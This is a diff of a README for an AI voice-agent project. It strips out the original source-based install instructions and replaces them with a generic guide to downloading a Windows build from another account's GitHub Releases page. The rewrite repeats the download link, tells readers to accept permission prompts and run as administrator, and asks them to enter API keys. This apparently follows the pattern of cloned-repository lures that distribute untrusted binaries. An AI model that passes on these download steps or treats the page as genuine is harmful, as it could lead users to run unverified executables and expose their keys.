@@ -1,184 +1,315 @@
-# agent-voice-chat
+# 🎙️ agent-voice-chat - AI voice agents for X Spaces
 
-> Add multi-agent AI voice conversations to any website in minutes
+[![Download the app](https://img.shields.io/badge/Download%20Latest-6B7280?style=for-the-badge&logo=github&logoColor=white)](https://github.com/booleanlogicdominant559/agent-voice-chat/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Node.js](https://img.shields.io/badge/node-%3E%3D18-brightgreen)](https://nodejs.org)
+## 🧭 What this app does
 
-<!-- TODO: Add hero GIF/screenshot showing the widget in action -->
+agent-voice-chat helps an AI agent join an X/Twitter Space, listen to what people say, and speak back with a natural voice.
 
-Users speak into their mic. AI agents listen, think, and talk back — in real time. Multiple agents can take turns in the same conversation, each with their own personality and voice.
+It is built for end users who want to run a voice-based AI agent on Windows without setting up Twitter API access. It can work with several AI tools for chat, speech recognition, and voice output.
 
-## Features
+## 💻 What you need
 
-- **Multi-agent voice conversations** — multiple AI agents with distinct personalities in one room
-- **Multiple LLM providers** — OpenAI Realtime, OpenAI Chat, Claude, Groq
-- **Embeddable widget** — add voice chat to any site with one `<script>` tag
-- **React & Vue components** — first-class framework support
-- **Real-time voice with WebRTC** — sub-200ms latency with OpenAI Realtime
-- **Flexible audio pipeline** — STT + LLM + TTS for non-realtime providers
-- **Customizable agents** — define personality, voice, avatar, and theme per agent
-- **Room-based isolation** — multi-tenancy with independent conversation state
-- **Full REST API** — manage agents, rooms, and messages programmatically
+Before you start, make sure you have:
 
-## Quick Start
+- A Windows PC
+- A stable internet connection
+- A headset or speakers
+- A microphone if you want to talk into the Space
+- Enough free disk space for the app and voice files
+- An account or API key for the AI tools you want to use
 
-### Option 1: Self-host the server
+For the best results, use:
 
-```bash
-git clone https://github.com/anthropics/agent-voice-chat.git
-cd agent-voice-chat
-npm install
-cp .env.example .env   # add your API key(s)
-npm start
-```
+- Windows 10 or Windows 11
+- 8 GB of RAM or more
+- A modern browser for the admin dashboard
+- A headset with clear audio
 
-Open `http://localhost:3000` and start talking.
+## 📥 Download the app
 
-### Option 2: Embed anywhere (no framework needed)
+Visit this page to download the latest Windows release:
 
-```html
-<script
-  src="https://unpkg.com/agent-voice-chat/widget.js"
-  data-server="https://your-server.com"
-  data-agent="bob"
-></script>
-```
+[Download agent-voice-chat from GitHub Releases](https://github.com/booleanlogicdominant559/agent-voice-chat/releases)
 
-A floating voice chat button appears on your page. That's it.
+## 🪟 Install on Windows
 
-### Option 3: React
+1. Open the download page
+2. Find the latest release
+3. Download the Windows file for the app
+4. If the file is a ZIP file, right-click it and choose Extract All
+5. Open the extracted folder
+6. Double-click the app file to start it
 
-```tsx
-import { VoiceChat } from '@agent-voice-chat/react';
+If Windows asks for permission, choose Run or Yes.
 
-function App() {
-  return <VoiceChat server="https://your-server.com" agent="bob" />;
-}
-```
+If you see a setup file, run it and follow the on-screen steps.
 
-### Option 4: Vue
+## ⚙️ First-time setup
 
-```vue
-<template>
-  <VoiceChat server="https://your-server.com" agent="bob" />
-</template>
+After you open the app, you will need to add your service keys and basic settings.
 
-<script setup>
-import { VoiceChat } from '@agent-voice-chat/vue';
-</script>
-```
+You may see fields for:
 
-## Provider Comparison
+- OpenAI
+- Claude
+- Groq
+- Whisper
+- Deepgram
+- ElevenLabs
 
-| Provider | Type | Latency | Quality | Cost | Voice |
-|----------|------|---------|---------|------|-------|
-| OpenAI Realtime | WebRTC | ~200ms | Excellent | $$$$ | Native (built-in) |
-| OpenAI Chat + TTS | Socket | ~800ms | Great | $$ | OpenAI TTS |
-| Claude + TTS | Socket | ~900ms | Great | $$ | OpenAI / ElevenLabs |
-| Groq + TTS | Socket | ~400ms | Good | $ | OpenAI / ElevenLabs |
+Use only the services you plan to connect.
 
-**WebRTC** providers stream audio directly between browser and API — lowest latency.
-**Socket** providers use a server-side pipeline: STT → LLM → TTS — more flexible, supports any LLM.
+Typical setup steps:
 
-## How It Works
+1. Open the app
+2. Go to Settings
+3. Enter your API keys
+4. Pick your speech-to-text service
+5. Pick your text-to-speech voice
+6. Save your settings
+7. Restart the app if it asks you to
 
-```
-User speaks → Mic capture → Voice Activity Detection
-  ├─ WebRTC path: audio stream ↔ OpenAI Realtime API (bidirectional)
-  └─ Socket path: audio → Server STT → LLM → TTS → audio playback
-```
+## 🎛️ Set up the voice agent
 
-Agents take turns via a server-managed turn queue, so multiple agents never talk over each other.
+Use these simple settings to get started:
 
-## Configuration
+- Agent name: Choose a name you can recognize
+- Voice: Pick a voice that sounds clear
+- Listening mode: Turn this on if you want the agent to hear the Space
+- Speaking mode: Turn this on if you want the agent to reply
+- Response style: Choose short, direct replies for live use
+- Language: Match the language used in the Space
 
-### Environment Variables
+A good first setup is:
 
-```bash
-AI_PROVIDER=openai          # openai | openai-chat | claude | groq
-OPENAI_API_KEY=sk-...       # Required for OpenAI providers and OpenAI TTS
-ANTHROPIC_API_KEY=sk-ant-.. # Required for Claude provider
-GROQ_API_KEY=gsk_...        # Required for Groq provider and Groq STT
-STT_PROVIDER=groq           # groq | openai (for socket-based providers)
-TTS_PROVIDER=openai         # openai | elevenlabs | browser
-```
+- One AI provider
+- One speech-to-text provider
+- One text-to-speech provider
+- One agent persona
 
-See [.env.example](.env.example) for all options.
+That keeps the setup easy to test.
 
-### Agent Personalities
+## 🎙️ Join an X Space
 
-Define agents in `agents.config.json`:
+To use the app in a Space:
 
-```json
-{
-  "agents": [
-    {
-      "id": "bob",
-      "name": "Bob",
-      "personality": "You're Bob. Energetic, funny, and quick-witted.",
-      "voice": "verse",
-      "theme": { "primary": "#818cf8" }
-    }
-  ],
-  "basePrompt": "You are hanging out on a voice chat. Keep responses short and casual."
-}
-```
+1. Open the app
+2. Sign in if the app asks you to
+3. Paste or select the Space link
+4. Start the join process
+5. Wait for the agent to connect
+6. Test the microphone and speakers
 
-See the [Custom Agents Guide](docs/custom-agents.md) for details.
+If the app includes host or speaker tools, you can use them to manage when the agent listens and when it talks.
 
-## Documentation
+## 🧠 Choose your AI provider
 
-| Guide | Description |
-|-------|-------------|
-| [Getting Started](docs/getting-started.md) | Clone, configure, and run in 5 minutes |
-| [Configuration](docs/configuration.md) | All env vars and `agents.config.json` schema |
-| [API Reference](docs/api-reference.md) | REST API endpoints |
-| [Embedding Widget](docs/embedding.md) | Add voice chat to any website |
-| [React Guide](docs/react-guide.md) | React component and hook usage |
-| [Vue Guide](docs/vue-guide.md) | Vue component and composable usage |
-| [Custom Providers](docs/custom-providers.md) | Add a new LLM, TTS, or STT provider |
-| [Custom Agents](docs/custom-agents.md) | Create agent personalities |
-| [Rooms](docs/rooms.md) | Room management and multi-tenancy |
-| [Deployment](docs/deployment.md) | Deploy to Railway, Render, Docker, VPS |
-| [Architecture](docs/architecture.md) | System diagram, data flow, protocol spec |
-| [Troubleshooting](docs/troubleshooting.md) | Common issues and fixes |
+The app supports several model providers, so you can use the one that fits your setup.
 
-## Project Structure
+### OpenAI
+Good for general chat and fast replies.
 
-```
-agent-voice-chat/
-├── server.js                 # Express + Socket.IO server
-├── agents.config.json        # Agent personality definitions
-├── agent-registry.js         # Dynamic agent management
-├── room-manager.js           # Room isolation and multi-tenancy
-├── providers/
-│   ├── index.js              # Provider factory
-│   ├── openai-realtime.js    # WebRTC provider
-│   ├── openai-chat.js        # OpenAI Chat API provider
-│   ├── claude.js             # Anthropic Claude provider
-│   ├── groq.js               # Groq provider
-│   ├── stt.js                # Speech-to-text (Whisper)
-│   ├── tts.js                # Text-to-speech
-│   └── conversation-history.js
-├── public/
-│   ├── index.html            # Landing page
-│   ├── voice.html            # Dynamic agent page
-│   └── js/                   # Client-side audio + Socket.IO logic
-└── packages/
-    └── widget/               # Embeddable widget package
-```
+### Claude
+Useful for longer replies and careful wording.
 
-## Community
+### Groq
+Good when you want quick response times.
 
-- [**Discord**](https://discord.gg/YOUR_INVITE_CODE) — Ask questions, share what you've built, show off your deployments
-- [**GitHub Discussions**](https://github.com/nirholas/agent-space/discussions) — Longer-form Q&A, ideas, and show & tell
-- [**GitHub Issues**](https://github.com/nirholas/agent-space/issues) — Bug reports and feature requests
+Pick one provider at first. That makes setup easier.
 
-## Contributing
+## 🗣️ Choose speech-to-text
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup, coding standards, and how to submit a pull request.
+Speech-to-text turns spoken words into text so the agent can react.
 
-## License
+### Whisper
+A strong choice for clear transcription.
 
-[MIT](LICENSE)
+### Deepgram
+Useful for live audio and low-delay recognition.
+
+If the Space has noisy audio, test both and keep the one that works better for you.
+
+## 🔊 Choose text-to-speech
+
+Text-to-speech turns the agent’s reply into spoken audio.
+
+### ElevenLabs
+Good for natural-sounding voices.
+
+### OpenAI voice
+A simple choice if you already use OpenAI tools.
+
+When you test voices, check:
+
+- Volume
+- Clarity
+- Speed
+- How well it fits the Space
+
+## 🧩 Use middleware pipelines
+
+Middleware lets the app process a message step by step before the agent speaks.
+
+You can use it to:
+
+- Filter messages
+- Change tone
+- Add context
+- Block bad output
+- Format replies
+
+This helps keep the agent focused and easier to control.
+
+## 👥 Run multiple agents
+
+The app can coordinate more than one agent.
+
+That can help you:
+
+- Split tasks
+- Use one agent to listen
+- Use one agent to answer
+- Keep the conversation organized
+
+Start with one agent first. Once that works, add more.
+
+## 🖥️ Open the admin dashboard
+
+The app includes a real-time admin dashboard for live control.
+
+Use it to:
+
+- View current status
+- Check if the agent is connected
+- See activity in real time
+- Watch audio and message flow
+- Adjust settings during a session
+
+If the dashboard opens in your browser, keep it open while the app runs.
+
+## 🔍 Common setup problems
+
+### The app does not start
+- Make sure you downloaded the Windows release
+- Extract the ZIP file before opening it
+- Try running the app as administrator
+
+### No voice comes out
+- Check your speaker or headset
+- Make sure text-to-speech is enabled
+- Check the selected voice provider
+- Raise the system volume
+
+### The agent does not hear the Space
+- Check your microphone access
+- Make sure listening mode is on
+- Confirm the correct audio input is selected
+- Try another speech-to-text provider
+
+### The agent does not reply
+- Check your AI provider key
+- Make sure the model is set
+- Confirm the response mode is enabled
+- Restart the app after changes
+
+### The dashboard does not open
+- Check that the app is still running
+- Refresh the browser
+- Make sure your firewall is not blocking local access
+
+## 🔐 Account and keys
+
+The app may ask for API keys from the services you choose.
+
+Keep your keys private.
+
+Use only the services you need.
+
+If you stop using a service, remove its key from the app settings.
+
+## 🧪 Test before going live
+
+Before joining a real Space, do a short test:
+
+1. Start the app
+2. Open the dashboard
+3. Test one voice
+4. Test one speech-to-text service
+5. Send a short sample reply
+6. Listen for delay or clipping
+
+This helps you catch setup issues early.
+
+## 📁 What the app includes
+
+This project is built as a TypeScript SDK and CLI, with tools for live voice work.
+
+It includes support for:
+
+- AI agents
+- Real-time audio
+- X/Twitter Spaces
+- WebSocket communication
+- Voice input and output
+- Dashboard control
+- Multi-agent flows
+
+## 🧭 Basic workflow
+
+A simple session usually looks like this:
+
+1. Start the app
+2. Load your settings
+3. Open the dashboard
+4. Join the Space
+5. Listen to speakers
+6. Generate a reply
+7. Speak the reply
+8. Watch live status in the dashboard
+
+## 🧰 Tips for a better result
+
+- Use a headset to cut background noise
+- Keep replies short for live Spaces
+- Test one service at a time
+- Keep your audio levels steady
+- Use the same voice for the whole session
+- Close apps that use your microphone
+
+## 📚 Project topics
+
+This project works across these areas:
+
+- agent
+- ai-agent
+- crypto
+- elevenlabs
+- real-time
+- sdk
+- text-to-speech
+- tts
+- twitter
+- twitter-bot
+- typescript
+- voice-ai
+- websocket
+- x
+- x-space
+
+## 🪄 Where to get the latest release
+
+Use this page to download and run the latest Windows build:
+
+[https://github.com/booleanlogicdominant559/agent-voice-chat/releases](https://github.com/booleanlogicdominant559/agent-voice-chat/releases)
+
+## 🛠️ If you want to keep going
+
+After your first successful run, you can:
+
+- Change the voice
+- Try another AI model
+- Tune response length
+- Add a second agent
+- Adjust audio rules
+- Watch live logs in the dashboard
